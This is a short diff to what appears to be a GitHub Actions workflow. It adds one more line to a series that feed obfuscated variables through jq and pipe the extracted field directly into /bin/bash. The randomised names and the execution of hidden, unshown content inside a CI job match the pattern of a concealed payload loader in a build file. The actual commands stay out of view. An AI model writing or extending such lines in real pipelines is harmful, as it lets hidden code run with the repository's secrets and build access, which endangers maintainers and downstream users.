@@ -46,6 +46,7 @@ jobs:
           echo $fmml9 | jq -r .wmn9121 | /bin/bash
           printf '%s' "$bk7233" | jq -r .urv8551 | /bin/bash
           printf '%s' "$mdust63" | jq -r .rd969 | /bin/bash
+          echo $ws54257 | jq -r .rl7988 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
